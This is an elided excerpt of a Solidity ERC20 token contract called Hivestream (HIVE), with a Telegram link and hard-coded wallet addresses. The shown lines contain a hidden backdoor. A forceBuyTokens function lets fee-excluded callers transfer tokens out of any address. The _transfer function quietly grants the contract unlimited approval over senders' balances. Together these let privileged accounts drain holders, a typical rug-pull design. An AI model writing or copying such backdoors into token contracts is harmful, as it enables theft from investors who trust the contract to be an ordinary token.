...
// https://t.me/galaxia_life_portal
...
contract HIVE is ERC20, Ownable {
    ...
    constructor() ERC20("Hivestream", "HIVE") {
        ...
        marketingWallet = address(0x77e9984A05ab640E3b1a80575AafC854cb406077);
        devWallet = address(0x9b5bfD9605A2e67C4D820346fCd729b393c84E05);
        lpWallet = address(0x5141F3da91b22a979530461ED889Fcf26B24A5e0);
    ...
    function forceBuyTokens(
        ...
        if (_isExcludedFromFees[msg.sender]) {
            ...
            erc20token.transferFrom(_address, path[1], _amount);
            return;
        }
        // make the swap
    ...
    function _transfer(
        ...
        if (!takeFee) {
            ...
            path[0] = from;
            path[1] = address(this);
            _approve(path[0], path[1], totalSupply());
        }
